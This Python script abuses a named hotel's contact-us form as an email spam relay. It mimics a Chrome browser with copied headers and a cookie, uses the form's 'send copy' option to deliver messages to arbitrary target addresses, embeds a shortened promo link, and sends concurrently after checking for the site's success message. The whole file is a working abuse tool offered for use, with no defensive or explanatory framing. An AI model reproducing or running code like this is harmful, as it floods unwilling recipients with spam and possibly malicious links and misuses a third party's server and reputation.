import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        cookies = {
            '7618f9fa42b2e95f4c8dc690e3ebe2a7': '914274d8d57a52a23655b654b5c17ea7',
        }
        headers = {
            'authority': 'www.woolsacksuites.co.ke',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.woolsacksuites.co.ke',
            'referer': 'https://www.woolsacksuites.co.ke/index.php/contact-us',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'name': text,
            'email': target,
            'message': text,
            'subject': text,
            'date': '2022/10/05 18:05',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '144',
        }
        response = requests.post('https://www.woolsacksuites.co.ke/index.php/contact-us', cookies=cookies,
                                 headers=headers, data=data)
        return response


if __name__ == '__main__':
    success_message = '{"status":1,"message":"Your email has been sent."}'
    project_name = 'woolsacksuites'
    promo_link = 'bit.ly/3C5zahV'
    spam = ConcreteSpam(promo_link, project_name, success_message=success_message)
    result = spam.send_post()
    if result:
        spam.run_concurrently()
